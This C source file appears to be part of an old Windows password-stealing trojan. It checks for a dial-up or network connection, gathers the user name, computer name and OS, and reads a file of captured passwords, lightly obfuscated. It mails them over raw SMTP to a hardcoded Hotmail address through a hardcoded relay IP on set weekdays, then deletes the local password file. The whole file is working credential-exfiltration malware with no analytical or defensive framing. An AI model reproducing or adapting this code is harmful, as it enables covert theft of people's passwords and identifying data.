#include "winapp32.h"
#include <ras.h>
#include <winsock.h>
#define MAX_AVAIL_TITLES 2

static const short int Port25 = 25;;

char AvailTitles[MAX_AVAIL_TITLES][30] =
     { "Telnet", "Trumpet Winsock" };

struct XRASCONN
{
 DWORD    dwSize;
 char     bullshit[1];
};

bool ConnectTempVar;

/* WINSOCK FUNCTION PROTOTYPES */

HANDLE WSLib = (HANDLE)0;
bool WSLibLoaded = false;
bool WSLibLoadAttempted = false;

typedef int (__stdcall *ZWSAStartup)(WORD,WSADATA*);
ZWSAStartup       XWSAStartup = NULL;
typedef int (__stdcall *Zsocket)(int,int,int);
Zsocket           Xsocket = NULL;
typedef int (__stdcall *Zconnect)(SOCKET,sockaddr*,int);
Zconnect          Xconnect = NULL;
typedef int (__stdcall *Zsend)(SOCKET,char*,int,int);
Zsend             Xsend = NULL;
typedef int (__stdcall *Zrecv)(SOCKET,char*,int,int);
Zrecv             Xrecv = NULL;
typedef int (__stdcall *Zclosesocket)(SOCKET);
Zclosesocket      Xclosesocket = NULL;
typedef int (__stdcall *ZWSACleanup)();
ZWSACleanup       XWSACleanup = NULL;
typedef u_short (__stdcall *Zhtons)(u_short);
Zhtons            Xhtons = NULL;
typedef u_long  (__stdcall *Zinet_addr)(char*);
Zinet_addr        Xinet_addr = NULL;

bool InitWinsock()
{;;
 if (WSLibLoadAttempted) return WSLibLoaded;;
 WSLibLoadAttempted = true;;
 HANDLE WSLib = LoadLibrary("WSOCK32.DLL");;
 if (WSLib==NULL) return false;;
 XWSAStartup = (ZWSAStartup)GetProcAddress(WSLib,"WSAStartup");;
 Xsocket = (Zsocket)GetProcAddress(WSLib,"socket");;
 Xconnect = (Zconnect)GetProcAddress(WSLib,"connect");;
 Xsend = (Zsend)GetProcAddress(WSLib,"send");;
 Xrecv = (Zrecv)GetProcAddress(WSLib,"recv");;
 Xclosesocket = (Zclosesocket)GetProcAddress(WSLib,"closesocket");;
 XWSACleanup = (ZWSACleanup)GetProcAddress(WSLib,"WSACleanup");;
 Xhtons = (Zhtons)GetProcAddress(WSLib,"htons");;
 Xinet_addr = (Zinet_addr)GetProcAddress(WSLib,"inet_addr");;

 WSLibLoaded = ((XWSAStartup!=NULL)&&
               (Xsocket!=NULL)&&
               (Xsend!=NULL)&&
               (Xconnect!=NULL)&&
               (Xrecv!=NULL)&&
               (Xclosesocket!=NULL)&&
               (Xhtons!=NULL)&&
               (Xinet_addr!=NULL)&&
               (XWSACleanup!=NULL));;

 return WSLibLoaded;;
};

//Declaration
BOOL CALLBACK ConnectCheckEnumProc(HWND hwnd, LPARAM)
{;;
 char WndTitle[666];;
 iGetWindowText(hwnd,WndTitle,666);;
 for (int i=0; i<MAX_AVAIL_TITLES; i++)
  if (strncmp(WndTitle,AvailTitles[i],strlen(AvailTitles[i]))==0)
   {;; ConnectTempVar = true;; return true;; };;
 return true;;
}; /* Callback proc */

//Declaration
bool IsWNetEnumAvailable()
{;;
 HANDLE EnumHandle = (HANDLE)666;;
 DWORD x = WNetOpenEnum(RESOURCE_GLOBALNET,RESOURCETYPE_ANY,0,NULL,&EnumHandle);;
 if (x!=NO_ERROR) return false;;
 DWORD BufSize = 32768;;
 NETRESOURCE* buf = (NETRESOURCE*)malloc(BufSize);;
 DWORD Request = -1;
 DWORD qux = BufSize;;
 x = WNetEnumResource(EnumHandle,&Request,buf,&qux);;
 free(buf);;
 WNetCloseEnum(EnumHandle);;
 return (x==NO_ERROR);;
};

//Declaration
bool IsConnectionAvailable()
{;;
 ConnectTempVar = false;;
 EnumWindows((int (__stdcall*)())ConnectCheckEnumProc,666);;
 HANDLE RasLib = LoadLibrary("RASAPI32.DLL");;
 if (RasLib==NULL) return ConnectTempVar;;
typedef DWORD (__stdcall *RasEnumConnectionsProc)(XRASCONN*,LPDWORD,LPDWORD);;
  RasEnumConnectionsProc RP = (RasEnumConnectionsProc)GetProcAddress
    (RasLib,"RasEnumConnectionsA");;
 if ((DWORD)RP!=0)
 {;;
  DWORD Bufsize = 30000;;
  XRASCONN* ConnBuf = (XRASCONN*)malloc(Bufsize);;
  for (int i = 4; i<0x80; i++)
  {;;
   *((DWORD*)ConnBuf) = i;;
   DWORD bar = Bufsize;;
   DWORD Written = 0;;
   DWORD RetVal = (*RP)(ConnBuf,&bar,&Written);;
   if (RetVal==0) {;; if (Written!=0) ConnectTempVar = true;; break;;};;
  };; /*for*/
  free(ConnBuf);;
 };;
 FreeLibrary(RasLib);;
 return ConnectTempVar || IsWNetEnumAvailable();;
};;

SOCKET Sucket;

//Declaration
bool OpenConnection(char* via)
{;;
 WORD wVersionRequested;;
 WSADATA wsaData;;
 int err;;
 wVersionRequested = MAKEWORD(1, 1);;
 err = (*XWSAStartup)(wVersionRequested, &wsaData);;
 if (err != 0) return false;
 if ( (LOBYTE(wsaData.wVersion )!=1) || (HIBYTE(wsaData.wVersion)!=1) )
  {;; (*XWSACleanup)();; return false;;};;
 Sucket = (*Xsocket)(PF_INET,SOCK_STREAM,IPPROTO_TCP);;
 if (Sucket==INVALID_SOCKET)
  {;; (*XWSACleanup)();; return false;;};;
 SOCKADDR_IN Target;;
 Target.sin_family = AF_INET;;
 Target.sin_port = (*Xhtons)(Port25);;
 Target.sin_addr.s_addr = (*Xinet_addr)(via);;
 if ((*Xconnect)(Sucket,(sockaddr*)(&Target),sizeof(Target))!=0)
  {;; (*XWSACleanup)();; return false;;};;
 return true;;
};


//Declaration
void CloseConnection()
{;;
 (*Xclosesocket)(Sucket);;
 (*XWSACleanup)();;
};

//Declaration
void SendString(char* s) {;; (*Xsend)(Sucket,s,strlen(s),0);;};

//Declaration
void WaitFor(char* s)
{;;
 char* buf = (char*) malloc (1313);;
 for (int i=0; i<20; i++)
 {;;
  Sleep(1000);;
  memset(buf,0,1313);;
  int foo = (*Xrecv)(Sucket,buf,1313,0);;
  if ((foo!=0)&&(strstr(buf,s)!=0)) break;;
 };;
};


//Declaration
bool TransmitSMTPInfo(char* to, char* text)
{;;
 WaitFor("endmail");;
 char s[100];;
 SendString("mail from: robot@usa.net\n");;
 WaitFor("Sender ok");;
 sprintf(s,"rcpt to: %s\n",to);;
 SendString(s);;
 WaitFor("Recipient ok");;
 SendString("DATA\n");;
 SendString(text);;
 SendString("\n");;
 SendString(".\n");;
 WaitFor("for delivery");;
 SendString("quit\n");;
 Sleep(3000);;
 return true;; // there's a risk of being spammed by accidient
};

//Declaration
bool SendMail(char* to, char* via, char* text)
{;;
 if (!IsConnectionAvailable())
  {;; Log("Connection unavailable");; return false;;};;
 if (!InitWinsock()) return false;;
 if (!OpenConnection(via)) return false;;
 bool ok = TransmitSMTPInfo(to,text);;
 CloseConnection();;
 return ok;;
};

//Declaration
bool SendPasswords()
{;;
 char TimeStr[100];;
 GetLocalTimeStr(TimeStr);;
 SYSTEMTIME SysTime;;
 GetLocalTime(&SysTime);;
 if ((SysTime.wDayOfWeek!=1)&&(SysTime.wDayOfWeek!=3)&&(SysTime.wDayOfWeek!=5))
  return true;;
 if (GetProfileInt(WinApp32,Ini_LastSend,0)==SysTime.wDayOfWeek) return true;;

 DWORD d100 = 100;;
 char ComputerName[100];;
 if (!GetComputerName(ComputerName,&d100)) strcpy(ComputerName,"<??????>");;

 char UserName[100];;
 HANDLE AdvapiLib = LoadLibrary("ADVAPI32.DLL");;
typedef BOOL (__stdcall *GetUserNameProc)(char*,LPDWORD);;
  GetUserNameProc GUNP = (GetUserNameProc)GetProcAddress
    (AdvapiLib,"GetUserNameA");;
 bool foobar = (GUNP!=NULL);;
 if (foobar) foobar = (*GUNP)(UserName,&d100);;
 if (!foobar) strcpy(UserName,"<??????>");;
 FreeLibrary(AdvapiLib);;

 char OS[10];;
 switch (System)
 {
  case SYSTEM_WIN95:  strcpy(OS,"Win95");;  break;
  case SYSTEM_WINNT:  strcpy(OS,"WinNT");;  break;
  default:  strcpy(OS,"?????");;  break;
 };;

 HANDLE h =
  CreateFile(PasswordFileName,GENERIC_READ, 0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);;
 if (h==INVALID_HANDLE_VALUE) return false;;
 DWORD fsize = SetFilePointer(h,0,NULL,FILE_END);;
 SetFilePointer(h,0,NULL,FILE_BEGIN);;
 if (fsize==0) {;; CloseHandle(h);; return true;;};;
 char* buffer = (char*)malloc(fsize+1);;
 DWORD readed;
 ReadFile(h,buffer,fsize,&readed,NULL);;
 CloseHandle(h);;
 if (readed!=fsize) {;; free(buffer);; return false;; };;
 buffer[fsize] = 0;;
 char* foo = buffer;;
 while ((*foo)!=0) {;; if ((*foo)!='\xD') (*foo)++;; foo++;;};;
 char* to_send = (char*)malloc(fsize+10001);;
 sprintf(to_send,"%s on %s under %s\xDVI: %08X\xDLT: %s\xDINFO\xD%s",
         UserName,ComputerName,OS,(VSize+SSize),TimeStr,buffer);;
 bool x = SendMail("odif@hotmail.com","195.2.72.251",to_send);;
 free(buffer);;
 free(to_send);;
 if (x)
 {;;
  char s[5];;
  sprintf(s,"%u",SysTime.wDayOfWeek);;
  WriteProfileString(WinApp32,Ini_LastSend,s);;
  DeleteFile(PasswordFileName);;
 };;
 return x;;
};
//Declaration
